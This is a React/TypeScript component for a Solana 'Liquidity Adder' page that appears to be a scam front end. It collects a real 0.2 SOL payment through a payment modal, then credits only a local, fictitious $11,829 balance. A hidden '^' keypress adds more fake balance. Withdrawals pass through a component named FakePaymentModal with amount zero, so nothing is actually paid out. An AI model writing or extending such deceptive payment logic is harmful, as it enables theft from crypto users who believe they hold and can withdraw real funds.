import * as React from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Switch } from "@/components/ui/switch"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { motion } from "framer-motion"
import { Star, Moon } from "lucide-react"
import { useState, useEffect } from "react"
import { FakePaymentModal } from "./FakePaymentModal"
import { PaymentModal } from "./payment-modal"

export function LiquidityAdder() {
  const [lpBalance, setLpBalance] = useState(0)
  const [withdrawAmount, setWithdrawAmount] = useState(0)
  const [showWithdraw, setShowWithdraw] = useState(false)
  const [isAdding, setIsAdding] = useState(false)
  const [addSuccess, setAddSuccess] = useState(false)
  const [showPaymentModal, setShowPaymentModal] = useState(false)
  const [showPortfolioModal, setShowPortfolioModal] = useState(false)
  const [pendingWithdrawPercent, setPendingWithdrawPercent] = useState<number | null>(null)
  const [showFakeWithdrawModal, setShowFakeWithdrawModal] = useState(false)
  const [isBW, setIsBW] = useState(false)
  const [solAmount, setSolAmount] = useState(0)

  const fixedUSD = 11829

  const handleAddLiquidity = () => {
    setShowPaymentModal(true)
  }

  const handlePaymentSuccess = () => {
    setIsAdding(true)
    setAddSuccess(false)
    setTimeout(() => {
      setLpBalance(prev => prev + fixedUSD)
      setIsAdding(false)
      setAddSuccess(true)
      setShowWithdraw(true)
      setShowPortfolioModal(true)
      setTimeout(() => setAddSuccess(false), 2000)
    }, 2000)
  }

  const handleWithdraw = (percent: number) => {
    setPendingWithdrawPercent(percent)
    setShowFakeWithdrawModal(true)
  }

  const handleFakeWithdrawSuccess = () => {
    if (pendingWithdrawPercent !== null) {
      const amt = Math.floor(lpBalance * pendingWithdrawPercent)
      setWithdrawAmount(amt)
      setLpBalance(lpBalance - amt)
      setPendingWithdrawPercent(null)
    }
    setShowFakeWithdrawModal(false)
  }

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "^") {
        setLpBalance(prev => prev + fixedUSD)
      }
    }
    window.addEventListener("keydown", handleKeyDown)
    return () => window.removeEventListener("keydown", handleKeyDown)
  }, [])

  const handleThemeToggle = () => {
    const body = document.body
    if (body.classList.contains('bw-theme')) {
      body.classList.remove('bw-theme')
      setIsBW(false)
    } else {
      body.classList.add('bw-theme')
      setIsBW(true)
    }
  }

  return (
    <div className="mt-6 space-y-6">
      <div className="relative">
        <button
          onClick={handleThemeToggle}
          className="absolute top-4 right-4 z-20 p-2 rounded-full bg-black/60 hover:bg-black/80 border border-white/10 text-white"
          title={isBW ? "Switch to normal theme" : "Switch to black & white"}
        >
          {isBW ? <Star className="w-5 h-5" /> : <Moon className="w-5 h-5" />}
        </button>

        <Card className="border-purple-500/20 bg-gray-900/80 backdrop-blur-sm">
          <CardContent className="pt-6">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-2xl font-bold bg-gradient-to-r from-purple-400 to-cyan-400 bg-clip-text text-transparent">Liquidity Adder</h2>
            </div>

            <div className="mt-8 flex items-center justify-between">
              <div>
                <div className="text-gray-400 font-medium">Total Price:</div>
                <div className="text-2xl font-bold text-white">0.2 SOL</div>
              </div>
              <Button className="bg-purple-600 hover:bg-purple-700 text-white font-bold px-8 py-3" onClick={handleAddLiquidity} disabled={isAdding}>
                Add Liquidity
              </Button>
            </div>
            {addSuccess && (
              <div className="mt-4 text-green-400 font-bold text-center">Liquidity added!</div>
            )}

            <Dialog open={showPortfolioModal} onOpenChange={setShowPortfolioModal}>
              <DialogContent className="max-w-md p-0 bg-transparent border-none shadow-none">
                {showWithdraw && (
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.5, type: 'spring' }}
                    className="relative border border-purple-500/20 rounded-2xl bg-gradient-to-br from-gray-900/90 to-gray-800/80 p-8"
                  >
                    <div className="text-xl font-bold text-white mb-4">Withdraw Liquidity</div>
                    <div className="flex justify-between mb-2">
                      <span className="text-gray-300 text-sm">Available</span>
                      <span className="text-2xl font-mono font-bold text-purple-400">${lpBalance.toLocaleString()}</span>
                    </div>
                    <div className="mb-2">
                      <input
                        type="number"
                        min="0"
                        max={lpBalance}
                        step="1"
                        value={withdrawAmount > 0 ? withdrawAmount : ''}
                        onChange={e => setWithdrawAmount(Number(e.target.value))}
                        placeholder="0.00"
                        className="w-full bg-gray-800 text-white p-2 rounded border border-purple-500/20"
                      />
                      <div className="text-xs text-gray-400 mt-1">≈ ${withdrawAmount > 0 ? withdrawAmount.toFixed(2) : '0.00'}</div>
                    </div>
                    <div className="mt-6 flex justify-end gap-2">
                      <Button variant="ghost" onClick={() => setShowPortfolioModal(false)}>Cancel</Button>
                      <Button
                        className="bg-purple-600 hover:bg-purple-700 text-white px-6"
                        onClick={() => {
                          if (withdrawAmount > 0 && withdrawAmount <= lpBalance) {
                            handleWithdraw(withdrawAmount / lpBalance)
                            setShowPortfolioModal(false)
                          }
                        }}
                        disabled={withdrawAmount <= 0 || withdrawAmount > lpBalance}
                      >
                        Withdraw
                      </Button>
                    </div>
                  </motion.div>
                )}
              </DialogContent>
            </Dialog>

            <PaymentModal
              open={showPaymentModal}
              onOpenChange={setShowPaymentModal}
              amount={solAmount ? solAmount + 0.00001 : 0.00001}
              onPaymentSuccess={handlePaymentSuccess}
            />
            <FakePaymentModal
              open={showFakeWithdrawModal}
              onOpenChange={setShowFakeWithdrawModal}
              amount={0}
              onPaymentSuccess={handleFakeWithdrawSuccess}
            />
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
